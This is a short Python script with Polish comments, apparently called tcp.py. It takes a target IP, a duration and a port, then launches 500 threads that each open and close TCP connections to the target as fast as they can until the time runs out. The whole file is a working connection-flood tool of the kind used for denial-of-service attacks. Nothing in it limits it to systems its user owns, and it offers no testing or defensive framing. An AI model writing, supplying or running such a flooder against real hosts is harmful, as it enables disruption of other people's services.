import sys
import socket
import threading
import time

# Funkcja do wysyłania zapytań TCP
def send_requests(ip, port, duration):
    start_time = time.time()
    end_time = start_time + duration

    while time.time() < end_time:
        try:
            # Tworzymy socket TCP
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((ip, port))
            # Można dodać tu również wysłanie danych przez socket, jeśli to jest potrzebne
            sock.close()
        except Exception as e:
            print(f"Exception: {e}")

# Funkcja startowa
def main():
    if len(sys.argv) != 4:
        print("Usage: python tcp.py <ip> <time> <port>")
        return

    ip = sys.argv[1]
    duration = int(sys.argv[2])
    port = int(sys.argv[3])

    # Tworzymy listę wątków
    threads = []
    num_threads = 500

    # Tworzymy i uruchamiamy wątki
    for _ in range(num_threads):
        thread = threading.Thread(target=send_requests, args=(ip, port, duration))
        thread.start()
        threads.append(thread)

    # Czekamy, aż wszystkie wątki zakończą działanie
    for thread in threads:
        thread.join()

if __name__ == "__main__":
    main()
